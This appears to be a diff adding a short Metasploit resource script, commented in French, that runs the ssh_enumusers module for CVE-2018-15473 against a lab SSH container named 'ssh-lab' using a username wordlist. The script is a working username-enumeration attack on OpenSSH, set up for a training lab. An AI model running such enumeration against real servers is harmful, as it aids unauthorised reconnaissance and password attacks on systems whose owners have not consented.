@@ -1,0 +1,10 @@
+# Script d'automatisation Metasploit pour CVE-2018-15473.
+# Depuis le conteneur attaquant, la cible est joignable par son nom de service
+# "ssh-lab" sur le port interne 22 (et non 2222, qui n'est que la publication hote).
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS ssh-lab
+set RPORT 22
+set USER_FILE /data/liste_utilisateurs.txt
+set THREADS 1
+run
+exit
